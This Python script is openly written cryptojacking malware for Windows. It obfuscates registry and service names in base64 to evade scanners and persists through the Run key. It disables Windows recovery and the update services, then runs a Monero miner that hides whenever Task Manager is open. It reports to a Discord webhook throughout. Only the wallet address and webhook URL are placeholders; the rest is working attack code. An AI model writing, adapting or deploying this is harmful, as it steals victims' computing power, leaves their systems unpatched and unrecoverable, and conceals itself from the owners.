import os, sys, time, winreg, subprocess, requests, psutil, base64, argparse

# --- 1. Identity Initialization ---
parser = argparse.ArgumentParser()
parser.add_argument("--id", default="SysAdmin")
ID = parser.parse_known_args()[0].id

# --- 2. Obfuscated Strings (Bypassing Scans) ---
# b64 for: Software\Microsoft\Windows\CurrentVersion\Run
REG_RUN = base64.b64decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu").decode()
# b64 for: wuauserv, bits, dosvc
SVC_LIST = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="]

WORK_DIR = os.path.join(os.getenv('APPDATA'), ID)
CONFIG = {
    "MINER": os.path.join(WORK_DIR, f"{ID}.exe"),
    "WALLET": "YOUR_MONERO_WALLET_ADDRESS",
    "POOL": "pool.supportxmr.com:443",
    "DISCORD": "YOUR_DISCORD_WEBHOOK_URL",
    "WATCH": "Taskmgr.exe",
    "IDLE_LIMIT": "90",
    "ACTIVE_LIMIT": "30"
}

def notify(msg):
    try: requests.post(CONFIG["DISCORD"], json={"content": f"**[{ID}]**: {msg}"})
    except: pass

# --- 3. System Lockdown Modules ---
def secure_vault():
    """Persistence, Reset Lock, and Update Lock."""
    # Persistence via Registry
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_RUN, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'pythonw.exe "{os.path.realpath(__file__)}" --id {ID}')
        winreg.CloseKey(key)
        notify("Persistence established.")
    except: pass
    
    # Lock Windows Reset (Reagentc)
    subprocess.run(["reagentc", "/disable"], capture_output=True)
    
    # Lock Windows Updates
    for s in SVC_LIST:
        name = base64.b64decode(s).decode()
        subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True)
        subprocess.run(["sc", "stop", name], capture_output=True)
    notify("System Reset and Updates locked.")

# --- 4. Execution & Stealth Modules ---
def manage_execution():
    """Smart Throttle (90%/30%) and Task Manager Stealth."""
    # Check for monitoring tools
    is_monitored = any(p.info['name'] == CONFIG["WATCH"] for p in psutil.process_iter(['name']))
    miner_proc = next((p for p in psutil.process_iter(['name']) if p.info['name'] == f"{ID}.exe"), None)

    if is_monitored:
        if miner_proc:
            try: 
                miner_proc.terminate()
                notify("Task Manager detected. Miner vanishing.")
            except: pass
    elif not miner_proc:
        # System is clear: Restart the miner (Self-healing)
        try:
            # Note: We launch at 90% capacity as the 'Idle' default
            subprocess.Popen([CONFIG["MINER"], "-o", CONFIG["POOL"], "-u", CONFIG["WALLET"], "--max-cpu-usage", CONFIG["IDLE_LIMIT"], "-k", "--tls"])
            notify(f"System clear. Re-engaging at {CONFIG['IDLE_LIMIT']}% capacity.")
        except Exception as e:
            notify(f"Self-Healing Failure: {e}")

# --- 5. Main Loop ---
def main():
    notify("Vault-Admin Online. Initializing Secure State...")
    secure_vault()
    while True:
        manage_execution()
        time.sleep(15)

if __name__ == "__main__":
    main()
